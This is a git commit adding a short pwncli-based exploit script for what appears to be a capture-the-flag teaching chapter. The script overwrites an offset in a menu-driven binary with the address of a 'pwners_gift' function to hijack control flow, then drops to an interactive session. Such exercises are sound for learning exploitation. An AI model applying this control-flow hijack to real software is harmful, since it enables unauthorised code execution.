93ce2f65f295924cffbac8b4d66ef867de81d8e7
AvavaAYA <nana7777777mi@gmail.com>
2023-03-25 22:56:25 +0800

    ch 1 update

---
+++ attachments/chp1-0/exp_flag1.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python3
+#-*- coding: utf-8 -*-
+#   expBy : @eastXueLian
+#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
+#   Remote: ./exp.py remote ./pwn ip:port
+
+from pwncli import *
+cli_script()
+set_remote_libc('libc.so.6')
+
+io: tube = gift.io
+elf: ELF = gift.elf
+libc: ELF = gift.libc
+
+i2b = lambda c : str(c).encode()
+lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
+debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")
+
+# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
+CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)
+
+def call_func(choice, off=0, length=0):
+    ru(b'Give me your choice:\n')
+    sl(i2b(choice))
+    ru(b"Where'd you love to start?\n")
+    sl(i2b(off))
+    if (choice == 1):
+        ru(b"How much do you want to write?")
+        sl(i2b(length))
+
+def flag1():
+    call_func(1, 0xf8, 8)
+    s(p64(elf.symbols['pwners_gift']))
+    call_func(-1)
+
+flag1()
+
+ia()
